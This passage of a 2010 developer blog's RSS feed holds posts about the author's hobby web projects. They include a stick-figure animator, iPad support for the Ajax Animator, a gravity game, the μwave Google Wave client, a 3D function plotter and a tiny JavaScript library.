&lt;p&gt;Basically, it’s organized into two panels, the left-side figures-box and the bottom timeline. The figures-box contains figures (amazing!) and clicking on them adds them to your canvas. The two defaults are the pivot-style stickman, and something called “blank” which is a root node with no additional nodes. Though it shows up as a orange dot, unless you add something to it, it doesn’t have any actual look when viewed in the player.&lt;/p&gt;
&lt;p&gt;On top is the context-sensitive buttons. Well the buttons in my screenshot aren’t context sensitive, they’re permanent. But when you click on a node, a new set of buttons (and words too!) appears. One is a line and the other is a circle. Click them to add a new segment or circle to the currently selected node. Then are various settings for the current segment (each node other than the root one is associated with a segment). Clicking those allows you to modify them. Also, a red X appears on the right, and that basically means remove the node and the child nodes.&lt;/p&gt;
&lt;p&gt;So, now you have some extra nodes, how do you change them? Simply hold it down and drag, and the the segments move as well. But note that the length of the segment doesn’t change as you move it. That’s because by default, it locks the length of the segments. There are two ways to get around it. The first is to hold shift while dragging. The second is to tap the little lock icon on the top left.&lt;/p&gt;
&lt;p&gt;On the bottom, is the timeline with live-previews of your frames with a semitransparent gray backdrop of numbers. Switch between each one by clicking on them and add one at the end by hitting the green “Add new frame” button.&lt;/p&gt;
&lt;p&gt;On the canvas, there are two yellow squares, those allow you to resize the canvas.&lt;/p&gt;
&lt;p&gt;On the very left of the top toolbar, is the play button. Hit it and the figures toolbox minimizes and it plays out your animation. Click it again to get back. Then is a little upload button. Hit it and then a little box pops up with a link to where you can find your animation in a way that you can share and to edit (not actually edit, but more like fork, as each save is given a unique id). Next is the download button which you hit, and get prompted by a big prompt-box which you use to paste in the ID of the animation you (or someone else) has saved, so you can edit it. Most of the time that’s useless as when you send a link with the player, it has a button which says “Edit”.&lt;/p&gt;
&lt;p&gt;Sample animation: &lt;a href=&quot;http://antimatter15.com/ajaxanimator/stick2/player.html?rlsm4lx14c&quot;&gt;http://antimatter15.com/ajaxanimator/stick2/player.html?rlsm4lx14c&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Try the application out: &lt;a href=&quot;http://antimatter15.com/ajaxanimator/stick2/stick2.html&quot;&gt;http://antimatter15.com/ajaxanimator/stick2/stick2.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Code: &lt;a href=&quot;http://github.com/antimatter15/stick2&quot;&gt;http://github.com/antimatter15/stick2&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Ajax Animator for iPad Updates</title>
      <link>http://antimatter15.com/2010/06/ajax-animator-for-ipad-updates/</link>
      <pubDate>Thu, 17 Jun 2010 02:38:19 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2010/06/ajax-animator-for-ipad-updates/</guid>
      <author></author>
      <description>&lt;p&gt;This isn’t really new, but I just remembered to write a post about it. &lt;a href=&quot;http://antimatter15.com/ajaxanimator/ipad/&quot;&gt;Ajax Animator for iPad&lt;/a&gt; got a relatively minor, but certainly pretty important update.&lt;/p&gt;
&lt;p&gt;The new update incorporates the &lt;a href=&quot;http://github.com/davidaurelio/TouchScroll&quot;&gt;TouchScroll j&lt;/a&gt;avascript library to have nice flick-to-scroll-ness throughout native iPad apps.&lt;/p&gt;
&lt;p&gt;The&lt;a href=&quot;http://jsvectoreditor.googlecode.com&quot;&gt; VectorEditor&lt;/a&gt; core had a few bug fixes, rotation now works and so does resizing (though it’s still susceptible to the&lt;a href=&quot;http://code.google.com/p/jsvectoreditor/issues/detail?id=1&quot;&gt; always-existent resizing of rotated objects awkwardness&lt;/a&gt; - I would love it for someone to &lt;a href=&quot;http://code.google.com/p/jsvectoreditor/source/browse/trunk/editor.js#383&quot;&gt;fix it&lt;/a&gt;). However, resizing doesn’t change the size of the bounding box, which is a somewhat awkward aesthetic but it’s still functional.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>gravity</title>
      <link>http://antimatter15.com/2010/06/gravity/</link>
      <pubDate>Thu, 10 Jun 2010 07:05:28 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2010/06/gravity/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;a href=&quot;http://antimatter15.com/misc/gravity2.html&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2010/gravity/antimatter15.com-misc-gravity2.html-Chromium_044.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;gravity2 screenshot&lt;/div&gt;&lt;/div&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://antimatter15.com/misc/gravity2.html&quot;&gt;Here’s my foray into the flash-esque html5 game arena&lt;/a&gt;. It’s a simple game built initially in &amp;lt;canvas&amp;gt; but later scrapped for Raphael because I guess it’s something more suitable for svg than canvas. The interface is fairly simple, you &lt;strong&gt;click to start the game&lt;/strong&gt;, where your projectile is sent off at the velocity relative to green blob in the center. Once it’s launched, the projectile is affected by the gravitational field of all the planets in some fairly pretty near-orbits. Once the projectile is in motion, &lt;strong&gt;clicking drops a new planet&lt;/strong&gt; at where your cursor is, &lt;strong&gt;holding down makes the planet grow&lt;/strong&gt;. The objective is to have the projectile not accelerate off the screen.&lt;/p&gt;
&lt;p&gt;As per &lt;a href=&quot;http://en.wikipedia.org/wiki/Kepler&quot;&gt;Kepler’s laws&lt;/a&gt;, getting near a planet produces the &lt;a href=&quot;http://en.wikipedia.org/wiki/Gravity_assist&quot;&gt;“gravitational slingshot”&lt;/a&gt; effect. Since the projectile tends to fly toward the center of planets, a magical &lt;a href=&quot;http://en.wikipedia.org/wiki/Divide_by_zero&quot;&gt;divide-by-zero&lt;/a&gt; causes the infinite acceleration toward doom.&lt;/p&gt;
&lt;p&gt;As with several other of my  recent projects, it supports various configuration options via the url query string. If you don’t know how it works, basically, you append ?opt1=val1&amp;amp;opt2… to the url. Example: &lt;a href=&quot;http://antimatter15.com/misc/gravity2.html?grav=4&quot;&gt;gravity2.html?grav=4&lt;/a&gt; , simply &lt;a href=&quot;http://antimatter15.com/misc/gravity2.html?fastest&quot;&gt;gravity2.html?fastest&lt;/a&gt; or a combo of &lt;a href=&quot;http://antimatter15.com/misc/gravity2.html?fastest&amp;amp;grav=4&amp;amp;random&quot;&gt;gravity2.html?fastest&amp;amp;grav=4&amp;amp;random&lt;/a&gt;. The current options are &lt;em&gt;fastest&lt;/em&gt; to prevent the targeting of 80fps (accepts no args), &lt;em&gt;target&lt;/em&gt; the target fps (obviously can not be used with fastest, in the case, &lt;em&gt;fastest&lt;/em&gt; takes precedence) and it accepts one numerical argument, the default is 80. &lt;em&gt;grav&lt;/em&gt; accepts one numerical argument, the default is 4 and is the attraction of the planets (&lt;a href=&quot;http://antimatter15.com/misc/gravity2.html?grav=0&quot;&gt;zero isn’t very fun&lt;/a&gt;). _random _makes the planets start off in random places rather than the predefined magical positioning.&lt;/p&gt;
&lt;p&gt;Feel free to post highscores in the comments.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>μwave updates</title>
      <link>http://antimatter15.com/2010/06/mwave-updates/</link>
      <pubDate>Wed, 02 Jun 2010 22:34:26 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2010/06/mwave-updates/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;a href=&quot;/articles/2010/μwave%20updates/microwave62.png&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2010/μwave%20updates/microwave62.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;μwave June 2 Wave View&lt;/div&gt;&lt;/div&gt;&lt;/a&gt;&lt;a href=&quot;/articles/2010/μwave%20updates/microwave62s.png&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2010/μwave%20updates/microwave62s.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;Microwave June 2 Search&lt;/div&gt;&lt;/div&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://antimatter15.com/2010/06/mwave-updates/2010/05/%CE%BCwave-lightweight-mobile-wave-client/&quot;&gt;Over a few days,&lt;/a&gt; things can change fairly quickly. There have been several &lt;strong&gt;speed improvements&lt;/strong&gt;, a new &lt;strong&gt;Forum-Style blip rendering&lt;/strong&gt; option which arranges blip linearly by the time edited with each containing a formatted quote of the parent to establish context. &lt;strong&gt;Attachments&lt;/strong&gt; are now fully supported, including thumbnails and download links. The operations engine was totally rewritten which uses asynchronous XMLHttpRequest, a new callback based system and support for a batch operations (which means fewer requests and faster responses). A wavelet header containing a list of all participants in the entire wave has been added, as well as an &lt;strong&gt;Add Participant &lt;/strong&gt;button. A &lt;strong&gt;specialized, extremely fast gadget viewer &lt;/strong&gt;was added, which allows for blazingly fast rendering of two popular gadgets (and more will come), it works by bypassing the entire gadget infrastructure and loading trusted code directly inline with the DOM. There is a “New Wave” button which allows people to &lt;strong&gt;create new waves directly from the client&lt;/strong&gt;. The OAuth backend was authenticated with google, for more secure login transactions. Blips have a &lt;strong&gt;new context menu&lt;/strong&gt; which allows for features such as &lt;strong&gt;Delete Blip, Edit Blip and Change Title&lt;/strong&gt;. A &lt;a href=&quot;http://antimatter15.com/misc/read/?googlewave.com!w+mrqWFs0vA&quot;&gt;full changelog can be found here&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://micro-wave.appspot.com&quot;&gt;Try it out.&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Steganography in Javascript</title>
      <link>http://antimatter15.com/2010/06/steganography-in-javascript/</link>
      <pubDate>Wed, 02 Jun 2010 06:01:05 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2010/06/steganography-in-javascript/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;a href=&quot;/articles/2010/Steganography%20in%20Javascript/Selection_034.png&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2010/Steganography%20in%20Javascript/Selection_034.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;Steganography Kitteh&lt;/div&gt;&lt;/div&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;For no real reason, I was reading the Wikipedia article on &lt;a href=&quot;http://en.wikipedia.org/wiki/Steganography#Digital_steganography&quot;&gt;Digital Steganography&lt;/a&gt; and saw the interesting image where an image of a kitty is extracted from some boring trees. I decided to &lt;a href=&quot;http://antimatter15.com/misc/steganography.html&quot;&gt;port the example to &amp;lt;canvas&amp;gt;&lt;/a&gt;.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>μwave lightweight mobile wave client</title>
      <link>http://antimatter15.com/2010/05/mwave-lightweight-mobile-wave-client/</link>
      <pubDate>Sat, 29 May 2010 06:08:40 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2010/05/mwave-lightweight-mobile-wave-client/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;a href=&quot;/articles/2010/μwave%20lightweight%20mobile%20wave%20client/http-micro-wave.appspot.com-static-ui.html-Chromium_025.png&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2010/μwave%20lightweight%20mobile%20wave%20client/http-micro-wave.appspot.com-static-ui.html-Chromium_025.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;Microwave Wave-View May 29&lt;/div&gt;&lt;/div&gt;&lt;/a&gt;&lt;a href=&quot;/articles/2010/μwave%20lightweight%20mobile%20wave%20client/http-micro-wave.appspot.com-static-ui.html-Chromium_023.png&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2010/μwave%20lightweight%20mobile%20wave%20client/http-micro-wave.appspot.com-static-ui.html-Chromium_023.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;Microwave Search-View May 29&lt;/div&gt;&lt;/div&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;I like bragging when I do something nobody else has done before. And &lt;strong&gt;μwave &lt;/strong&gt;is the first true third-party wave client which is compatible with Google Wave. It’s free to use at &lt;a href=&quot;http://micro-wave.appspot.com/&quot;&gt;http://micro-wave.appspot.com/&lt;/a&gt; and works great on mobile devices. It supports searching for waves, opening them and writing replies.&lt;/p&gt;
&lt;p&gt;Currently it doesn’t know read/unread state of the waves from the search panel and doesn’t know read/unread blips, but as of time of writing, its a limitation and flaw in the current version of the &lt;strong&gt;Google Wave Data API &lt;/strong&gt;(introduced just ten days ago at Google I/O). Expect this to be resolved in the near future with upcoming versions of the API and this application.&lt;/p&gt;
&lt;p&gt;The source code for the server component is open-source and can be &lt;a href=&quot;http://gist.github.com/417035&quot;&gt;found on github&lt;/a&gt; (though it’s slightly outdated, but the important stuff is there). It’s fairly simple (It’s based on the original &lt;a href=&quot;http://oauth.googlecode.com/svn/code/python/oauth/example/client.py&quot;&gt;example code&lt;/a&gt; so I’m going to have the same MIT license), but one of the few python scripts which can do authentication with google and pass commands to the data api.  It relies on the &lt;a href=&quot;http://oauth.googlecode.com/svn/code/python/oauth/&quot;&gt;Python OAuth Library&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;The Blip renderer component of this is licensed under the MIT license and can be found on the &lt;a href=&quot;http://microwave.googlecode.com/hg/bliprender2.html&quot;&gt;old microwave repo&lt;/a&gt;. The only part left is the interface, which is going to be the usual GPLv3.&lt;/p&gt;
&lt;p&gt;For a little bit of history, this isn’t exactly a new project. The&lt;a href=&quot;http://code.google.com/p/microwave/source/detail?r=cb27d32b3a5ee5aeaef38c58463268e7931f60f0&quot;&gt; google code project&lt;/a&gt; has existed since January 9th, 2010. The purpose was to create a mobile-friendly version of Wave Reader. But that goes even deeper, I can trace it back to the&lt;a href=&quot;http://static-bot.appspot.com/view/?id=googlewave.com!w+DUX6159GV&quot;&gt; original Static-Bot&lt;/a&gt; dated to October 18, 2009. Then, the Google Wave embed API allowed people to view waves only if someone had a Google Wave account and was logged in at the time. This was quite problematic as Wave was still a limited preview which not many people had and probably hampered adoption.&lt;/p&gt;
&lt;p&gt;Another separate but eventually convergent issue which led to the microwave project was “&lt;a href=&quot;http://antimatter15.com/misc/read/?googlewave.com!w+Ze3l0mj0A&quot;&gt;Desktop Wave Reader + GWave Client/Server Protocol&lt;/a&gt;“ post which I made on October 29th of 2009.&lt;/p&gt;
&lt;p&gt;During late October of last year, I reverse-engineered some of the features of the Google Wave client. Up until then, the only published specs were the federation protocols, which dealt with how multiple wave servers would use a common protocol to allow multiple users without a central authority and for the gadget and robot apis. Notably missing was a client/server api, for a user of specifically the google wave client, which did not yet support federation (and to date, preview still does not), and to browse/view the waves in one’s inbox without needing to switch to an entirely new provider. The first component was the ability to read waves. After that was accomplished, I tried to reverse engineer a more complex aspect of the protocol, which was the ability to search waves. I eventually realized that that component, search was part of a larger puzzle, which was the real-time BrowserChannel wire protocol which virtually all of wave was based. I made some progress, but near the end, I gave up in frustration. Luckily, someone else became interested in the same thing, and&lt;a href=&quot;http://antimatter15.com/2010/05/mwave-lightweight-mobile-wave-client/github.com/waverz/waveclient&quot;&gt; Silicon Dragon basically got search working&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;This happened now in early December. I started on a project called &lt;a href=&quot;http://antimatter15.com/2010/05/mwave-lightweight-mobile-wave-client/2010/01/wave-reader-4-6/&quot;&gt;Wave Reader&lt;/a&gt;, which merged the ideas of static-bot with the desktop wave reader and a new functional blip rendering engine. At that time, the Google Wave client was still horrendously slow, taking several minutes at times to load large waves.&lt;/p&gt;
&lt;p&gt;On January, I began a project to merge Wave Reader and the wire protocol (search). I thought an awesome name would be microwave (or μwave) and started the code repo on January 9th. I worked on it a bit, so that it was mostly complete, with search and loading all working, with one missing component: login. Eventually, I got bored and the project lay abandoned for a few months.&lt;/p&gt;
&lt;p&gt;This gets us to basically 4 days ago, when I started working on a renaissance of the μwave project, based on the recently released Google Wave Data API. The first component was creating a new blip renderer specifically designed for parsing the new (much cleaner) json format which is part of the robots api. Then I created a client around that and created a python backend for having it work on app engine.&lt;/p&gt;
&lt;p&gt;The Future is always awesome to prophesize about. In the coming weeks or days, google will probably update the data api to allow for information like  So, while &lt;a href=&quot;http://micro-wave.appspot.com&quot;&gt;http://micro-wave.appspot.com&lt;/a&gt; will likely remain free and maintained for the forseeable future, I do plan on making a paid iPhone/iPad app. The iPhone app may have some extra features like offline/caching support.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Simple Javascript 3D Function Plotter</title>
      <link>http://antimatter15.com/2010/05/simple-javascript-3d-function-plotter/</link>
      <pubDate>Tue, 04 May 2010 05:37:59 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2010/05/simple-javascript-3d-function-plotter/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;a href=&quot;/articles/2010/Simple%20Javascript%203D%20Function%20Plotter/Screen-shot-2010-05-04-at-4.18.38-PM.png&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2010/Simple%20Javascript%203D%20Function%20Plotter/Screen-shot-2010-05-04-at-4.18.38-PM.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;sin(sqrt(sq(x)+sq(y)))/sqrt(sq(x)+sq(y))&lt;/div&gt;&lt;/div&gt;&lt;/a&gt; sin(sqrt(sq(x)+sq(y)))/sqrt(sq(x)+sq(y))&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://antimatter15.com/misc/f(x&quot;&gt;http://antimatter15.com/misc/f(x).html?sin(sqrt(sq(x)+sq(y)))/5&lt;/a&gt;.html?sin(sqrt(sq(x)+sq(y)))/5  )&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://antimatter15.com/misc/f(x&quot;&gt;http://antimatter15.com/misc/f(x).html?sin(sqrt(sq(x)+sq(y)))/sqrt(sq(x)+sq(y))&lt;/a&gt;.html?sin(sqrt(sq(x)+sq(y)))/sqrt(sq(x)+sq(y))  )&lt;/p&gt;
&lt;p&gt;I think function plotters are cool, and since 3d is all the hype nowadays, why not make a 3d function plotter? I like how WolframAlpha does it quite nicely, but it doesn’t allow panning/moving of the camera. Just as a disclaimer, I made this because it’s cool, not because I spent lots of time on it, on the contrary, it’s taken from the three.js 3D Canvas library floor demo with a 3 line change to make it pull a function from the URL.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Ajax Animator iPad Support</title>
      <link>http://antimatter15.com/2010/04/ajax-animator-ipad-support/</link>
      <pubDate>Sun, 11 Apr 2010 04:51:14 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2010/04/ajax-animator-ipad-support/</guid>
      <author></author>
      <description>&lt;p&gt;Today I went to the magical Apple Store and tried out the iPad for the first time. I really have to say that it’s quite magical, though it doesn’t fulfill the criterion for &lt;a href=&quot;http://en.wikipedia.org/wiki/Clarke&quot;&gt;Arthur C. Clarke’s Third Law&lt;/a&gt; despite what &lt;a href=&quot;http://www.apple.com/ipad/#video&quot;&gt;Jonathan Ive&lt;/a&gt; says. Though I really haven’t tried any large area multitouch interface before (sadly), and I would expect it to be a somewhat similar if not exact replica of the experience. Keynote and Numbers were pretty neat (I suck at typing on the iPad in any orientation, so I don’t like Pages). That’s enough to show that iPad is not just a content consumption tool as the iPod and iPhone primarily are, but also content creation.&lt;/p&gt;
&lt;p&gt;Anyway, in a few minutes I just swapped the mousedown, mousemove, mouseup events with touchstart, touchmove, touchend events respectively in the core of VectorEditor, while adding a new MobileSafari detection script (var mobilesafari = /AppleWebKit.*Mobile/.test(navigator.userAgent);) and in a quite analogous “magical” way, V&lt;a href=&quot;http://code.google.com/p/jsvectoreditor/source/detail?r=202&quot;&gt;ectorEditor works in iPhone/iPod Touch&lt;/a&gt; and theoretically iPad, Just dragging the vectoreditor files over to the Ajax Animator folder and recompiling should bring iPad support to Ajax Animator with virtually no work.&lt;/p&gt;
&lt;p&gt;I haven’t tested it. Downloading XCode 3.2.2 right now so hopefully I can test it soon. Stupid how it’s what? 2.31 gigabytes?!&lt;/p&gt;
&lt;p&gt;And possibly, I could use PhoneGap to hack together a App Store app which does the same thing (and maybe charge for it, which might be a bit cruel as this application is open source and works equivalently online - but I guess that’s okay for those people who don’t read my blog &amp;gt;:) ). Maybe get enough to buy an iPad :P&lt;/p&gt;
&lt;p&gt;Anyway, though I’m pretty late to this and my opinion probably doesn’t matter at all, here’s a mini iPad review: It’s really really cool, feels sort of heavy, really expensive, hard to type on in any orientation (interestingly it has that little linke on the f and j keys with the keyboard which feels useless since I always thought the point of that was so you can tactile-ily or haptically or tactically or whatever the right word is, find the home row, but since there’s no physical dimension to an iPad, it just strikes me as weird and wanting of that tactile keyboard). Otherwise, browsing really really feels great. Only thing I miss is the Macbook Pro style 3 finger forward/backward gestures (@AAPL plz add this before iPad2.0, and also, get iPhoneOS 4.0 to work on my iPhone 2g or at least @DevTeam plz hack 4.0 for the 2g!).&lt;/p&gt;
&lt;p&gt;Oh, and for those lucky enough to have a magical iPad, the URL is &lt;a href=&quot;http://antimatter15.com/ajaxanimator/ipad/&quot;&gt;http://antimatter15.com/ajaxanimator/ipad/&lt;/a&gt; at least until there’s enough testing to make sure that I didn’t screw up everything with my MobileSafari hacks.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Idea: Lego Mindstorms IDE for iPad</title>
      <link>http://antimatter15.com/2010/04/idea-lego-mindstorms-ide-for-ipad/</link>
      <pubDate>Wed, 07 Apr 2010 23:52:13 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2010/04/idea-lego-mindstorms-ide-for-ipad/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;a href=&quot;/articles/2010/Idea%20Lego%20Mindstorms%20IDE%20for%20iPad/ipod-nxt.jpg&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2010/Idea%20Lego%20Mindstorms%20IDE%20for%20iPad/ipod-nxt.jpg&quot; &gt;&lt;div class=&quot;caption&quot;&gt;ipod-nxt&lt;/div&gt;&lt;/div&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;I don’t have an iPad, nor is it #1 on my wish list (It mostly means any tablet platform but since none of the other ones are really recognizable, I’m jumping on the &lt;a href=&quot;http://www.apple.com/ipad/&quot;&gt;4-letter apple produc&lt;/a&gt;t bandwagon). But I am fascinated by touchscreens.&lt;/p&gt;
&lt;p&gt;I started programming when I was 7 when I got my first &lt;a href=&quot;http://www.amazon.com/LEGO-Mindstorms-Robotics-Invention-System/dp/B00005R6ZI&quot;&gt;Lego Mindstorms RIS/RCX 2.0&lt;/a&gt; kit (and I loved the 13+ sticker on the box back then :P). So I’ve always had a fondness for &lt;a href=&quot;/articles/2010/Idea%20Lego%20Mindstorms%20IDE%20for%20iPad/ris-programming.jpg&quot;&gt;the platform&lt;/a&gt;, it’s really great for getting kids into robotics and engineering. Kudos to Lego.&lt;/p&gt;
&lt;p&gt;Recently, I’ve played around with the current rendition of the Mindstorms platform, the NXT. It’s an evolutionary advancement for the platform and maintains the original intuition of the system while catering to those who don’t really grow out of the original system.&lt;/p&gt;
&lt;p&gt;The interface is, a very kid-friendly &lt;a href=&quot;/articles/2010/Idea%20Lego%20Mindstorms%20IDE%20for%20iPad/image.axd&quot;&gt;drag-and-drop block layout&lt;/a&gt;. I actually sort of like it, though it’s not something which a desktop application could easily be made in. It’s very procedural, and that’s well suited for telling a car to explode and magically arrange red and blue balls into designated corners.&lt;/p&gt;
&lt;p&gt;But really, where drag and drop really shines, the place where it really is &lt;em&gt;meant to be&lt;/em&gt;, is on a multitouch tablet. It just makes sense. On a large multitouch surface, coding using simple finger gestures and dragging just makes sense. Lego’s own Labview interface, called NXT-G has large icons and is built entirely on the dragging and dropping. Its something that just feels &lt;em&gt;right&lt;/em&gt; on a touchscreen.&lt;/p&gt;
&lt;p&gt;The gestures need to be tailored to the specific platform, I propose that two fingers, like on a Macbook, should be used to pan around the canvas of the code. Blocks are dragged from a list on the side onto an execution path. On a block already on the canvas, touching and dragging does the logical thing: it moves the position. Touching a block on the canvas without dragging makes a pie menu type display ooze out from the block. The list would be a bunch of output “pipes” which another finger can be used to drag and link onto other blocks which display another pie menu (though only showing inputs rather than outputs) where letting go would create the connection.&lt;/p&gt;
&lt;p&gt;Implementation-wise, one could try porting &lt;a href=&quot;http://bricxcc.sourceforge.net/nbc/&quot;&gt;NBC/NXC &lt;/a&gt;(which is written in Pascal and already has the makefiles for WinCE/ARM and &lt;a href=&quot;http://wiki.freepascal.org/iPhone/iPod_development&quot;&gt;FreePascal does seem to be able to compile to iPhone/iPod Touch&lt;/a&gt; and the iPad should be a virtually equivalent platform). Probably something made in SVG and/or &amp;lt;canvas&amp;gt; could be used to create the interface which can be loaded with a &lt;a href=&quot;http://developer.apple.com/iphone/library/documentation/UIKit/Reference/UIWebView_Class/Reference/Reference.html&quot;&gt;UIWebView&lt;/a&gt; or using the &lt;a href=&quot;http://phonegap.com/&quot;&gt;PhoneGap&lt;/a&gt; platform. Then it would convert the graphical representation into some NXC code, compile it, and use the built in Bluetooth 2.1 + EDR support in an iPad to send it to the Lego NXT brick and do magic.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>2.3KB JS Library with ajax, animation, dom manipulation, json encoding</title>
      <link>http://antimatter15.com/2010/03/2-3kb-js-library-with-ajax-animation-dom-manipulation-json-encoding/</link>
      <pubDate>Sat, 06 Mar 2010 23:29:06 -0500</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2010/03/2-3kb-js-library-with-ajax-animation-dom-manipulation-json-encoding/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;a href=&quot;/articles/2010/2.3KB%20JS%20Library%20with%20ajax,%20animation,%20dom%20manipulation,%20json%20encoding/Screenshot-1.png&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2010/2.3KB%20JS%20Library%20with%20ajax,%20animation,%20dom%20manipulation,%20json%20encoding/Screenshot-1-300x167.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;Screenshot-1&lt;/div&gt;&lt;/div&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;vX was an old project which aimed to do lots of nifty things in the least code possible (3KB without gzip!), but among its goals, developer friendliness wasn’t present. So now, I made a new library, this one is 5KB before gzip, and supports most of what vX does, but with DOM manipulation as well, in a jquery-like manner, and animations with queuing and easing. The new library (which doesn’t yet have a name) aims to be really lightweight (which really doesn’t matter much), while being more developer friendly.&lt;/p&gt;
&lt;p&gt;For example, I can select all elements with the class “test” using &lt;em&gt;.cls(“test”), and make them purple by doing &lt;/em&gt;.cls(“test”).css(“color”,”purple”) similar to jQuery. I can do &lt;em&gt;.id(“yay”).load(“lib.js”) to load something using ajax. Creating elements is pretty easy too, say I want to load a random script, I can do &lt;/em&gt;.create(“script”).attr(“src”,”url”).appendTo(&lt;em&gt;.tag(“body”)) and I can add events to something using &lt;/em&gt;.tag(“button”).index(0).on(“click”,function(e){alert(“yay”)}).&lt;/p&gt;
&lt;p&gt;Here’s a nice little demo of what it can do &lt;a href=&quot;http://jsbin.com/owuge/31&quot;&gt;http://jsbin.com/owuge/31&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;I intended to post this back in March 7th, but I was working on a rewrite of the library, which would be a tiny bit larger but implement CSS-selectors and be easier to maintain.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Onion Skinning in Ajax Animator</title>
      <link>http://antimatter15.com/2010/03/onion-skinning-in-ajax-animator/</link>
      <pubDate>Mon, 01 Mar 2010 00:06:27 -0500</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2010/03/onion-skinning-in-ajax-animator/</guid>
      <author></author>
      <description>&lt;p&gt;The Ajax Animator (Wave/Mini interface version) now has support for basic Onion skinning, where the last keyframe is semitransparently placed in the background to aid in the positioning of the next keyframe. It’s now enabled by default at 20% opacity but can be disabled.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;/articles/2010/Onion%20Skinning%20in%20Ajax%20Animator/ajax-animator.png&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2010/Onion%20Skinning%20in%20Ajax%20Animator/ajax-animator-300x210.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;ajax-animator&lt;/div&gt;&lt;/div&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;To disable it, click the advanced button on the right side of the toolbar and find the entry labeled Onion Skinning, there you can set the onion skinning opacity or disable it with 0% opacity.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;/articles/2010/Onion%20Skinning%20in%20Ajax%20Animator/onion-skinning.png&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2010/Onion%20Skinning%20in%20Ajax%20Animator/onion-skinning-300x132.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;onion-skinning&lt;/div&gt;&lt;/div&gt;&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Stick Figures!</title>
      <link>http://antimatter15.com/2010/02/stick-figures/</link>
      <pubDate>Sat, 27 Feb 2010 00:00:06 -0500</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2010/02/stick-figures/</guid>
      <author></author>
